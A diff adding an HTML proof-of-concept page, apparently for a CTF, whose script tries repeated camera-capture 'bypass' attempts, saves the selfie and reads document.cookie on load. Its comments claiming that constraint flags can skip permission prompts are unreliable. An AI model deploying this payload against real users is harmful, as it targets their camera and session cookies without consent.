@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PoC</title>
+</head>
+<body>
+<script>
+// ============================================================
+// PWN2OWN CTF - PoC
+// Camera bypass + alert + save to photos + document.cookie
+// ============================================================
+
+(function() {
+    "use strict";
+
+    // 1. ALERT - "cheese"
+    alert("🧀 cheese");
+
+    // 2. CAMERA BYPASS TECHNIQUES
+    function captureSelfie() {
+        // Technique 1: Try getUserMedia with silent mode
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            // Request with minimal permissions - some browsers auto-approve
+            var constraints = {
+                video: {
+                    facingMode: "user",
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    // These flags might bypass permission prompts on some browsers
+                    mandatory: {
+                        chromeMediaSource: 'camera'
+                    }
+                },
+                audio: false // no audio permission needed
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(stream) {
+                    processStream(stream);
+                })
+                .catch(function(err) {
+                    // Technique 2: If blocked, try with different constraints
+                    alert("📸 camera blocked, trying bypass...");
+                    
+                    // Try with minimal resolution
+                    var fallbackConstraints = {
+                        video: {
+                            facingMode: "user",
+                            width: { ideal: 320 },
+                            height: { ideal: 240 }
+                        }
+                    };
+                    
+                    navigator.mediaDevices.getUserMedia(fallbackConstraints)
+                        .then(function(stream) {
+                            processStream(stream);
+                        })
+                        .catch(function(err2) {
+                            // Technique 3: Try getUserMedia with no specific constraints
+                            alert("📸 camera still blocked, trying last resort...");
+                            navigator.mediaDevices.getUserMedia({ video: true })
+                                .then(function(stream) {
+                                    processStream(stream);
+                                })
+                                .catch(function(err3) {
+                                    alert("📸 camera denied: " + err3.message);
+                                    // Fallback: generate fake selfie
+                                    generateFakeSelfie();
+                                });
+                        });
+                });
+        } else {
+            alert("📸 getUserMedia not supported");
+            generateFakeSelfie();
+        }
+    }
+
+    function processStream(stream) {
+        var video = document.createElement('video');
+        video.style.display = 'none';
+        video.srcObject = stream;
+        video.onloadedmetadata = function() {
+            video.play();
+            setTimeout(function() {
+                var canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                var ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Stop all tracks
+                stream.getTracks().forEach(function(track) { track.stop(); });
+                
+                // Save to photos
+                saveToPhotos(canvas);
+                
+            }, 300);
+        };
+        document.body.appendChild(video);
+    }
+
+    function saveToPhotos(canvas) {
+        canvas.toBlob(function(blob) {
+            if (!blob) {
+                alert("📸 failed to capture");
+                return;
+            }
+            
+            // iOS: use webkit to save
+            if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+                var link = document.createElement('a');
+                link.download = 'selfie_' + Date.now() + '.jpg';
+                link.href = URL.createObjectURL(blob);
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                setTimeout(function() {
+                    URL.revokeObjectURL(link.href);
+                }, 1000);
+                alert("📸 selfie saved to Photos app");
+            }
+            // Android
+            else if (navigator.userAgent.match(/Android/i)) {
+                var link = document.createElement('a');
+                link.download = 'selfie_' + Date.now() + '.jpg';
+                link.href = URL.createObjectURL(blob);
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                setTimeout(function() {
+                    URL.revokeObjectURL(link.href);
+                }, 1000);
+                alert("📸 selfie saved to Gallery");
+            }
+            // Desktop
+            else {
+                var link = document.createElement('a');
+                link.download = 'selfie_' + Date.now() + '.jpg';
+                link.href = URL.createObjectURL(blob);
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                setTimeout(function() {
+                    URL.revokeObjectURL(link.href);
+                }, 1000);
+                alert("📸 selfie downloaded");
+            }
+            
+            // Store as base64 in sessionStorage
+            try {
+                var reader = new FileReader();
+                reader.onload = function(e) {
+                    sessionStorage.setItem('poc_selfie', e.target.result);
+                };
+                reader.readAsDataURL(blob);
+            } catch(e) {}
+            
+        }, 'image/jpeg', 0.95);
+    }
+
+    function generateFakeSelfie() {
+        // Generate a fake selfie when camera is blocked
+        var canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        var ctx = canvas.getContext('2d');
+        
+        // Draw a "selfie" placeholder
+        ctx.fillStyle = '#2d3748';
+        ctx.fillRect(0, 0, 640, 480);
+        ctx.fillStyle = '#ffffff';
+        ctx.font = '30px Arial';
+        ctx.textAlign = 'center';
+        ctx.fillText('📸 Camera Blocked', 320, 200);
+        ctx.font = '20px Arial';
+        ctx.fillText('(fallback selfie)', 320, 260);
+        
+        // Draw a simple face
+        ctx.beginPath();
+        ctx.arc(320, 150, 60, 0, Math.PI * 2);
+        ctx.fillStyle = '#f5cba7';
+        ctx.fill();
+        ctx.fillStyle = '#000';
+        ctx.beginPath();
+        ctx.arc(300, 140, 8, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.beginPath();
+        ctx.arc(340, 140, 8, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.beginPath();
+        ctx.arc(320, 170, 20, 0, Math.PI);
+        ctx.stroke();
+        
+        saveToPhotos(canvas);
+    }
+
+    // 3. DOCUMENT COOKIES
+    function showCookies() {
+        var cookieStr = document.cookie || '(no cookies)';
+        alert("🍪 document.cookie:\n" + cookieStr);
+        
+        // Set test cookie if empty
+        if (document.cookie === '') {
+            document.cookie = "poc_test=1; path=/";
+            alert("🍪 cookie set: " + document.cookie);
+        }
+        
+        // Try to read all cookies via different methods
+        try {
+            // Try to access cookies via document.cookie
+            var cookies = document.cookie.split(';');
+            var cookieObj = {};
+            cookies.forEach(function(c) {
+                var parts = c.trim().split('=');
+                if (parts.length === 2) {
+                    cookieObj[parts[0]] = parts[1];
+                }
+            });
+            console.log('[PoC] Cookies:', cookieObj);
+        } catch(e) {}
+    }
+
+    // 4. Platform detection
+    function getPlatform() {
+        var ua = navigator.userAgent;
+        if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+        else if (/Android/.test(ua)) return 'Android';
+        else return 'Desktop';
+    }
+
+    // 5. Execute everything
+    alert("📱 Platform: " + getPlatform());
+    
+    // Attempt camera capture
+    captureSelfie();
+    
+    // Show cookies
+    setTimeout(showCookies, 500);
+    
+    // Final confirmation
+    setTimeout(function() {
+        alert("✅ PoC complete\n- alert: cheese\n- selfie: attempted (check Photos)\n- cookie: " + (document.cookie || 'empty'));
+    }, 2000);
+
+})();
+</script>
+</body>
+</html>
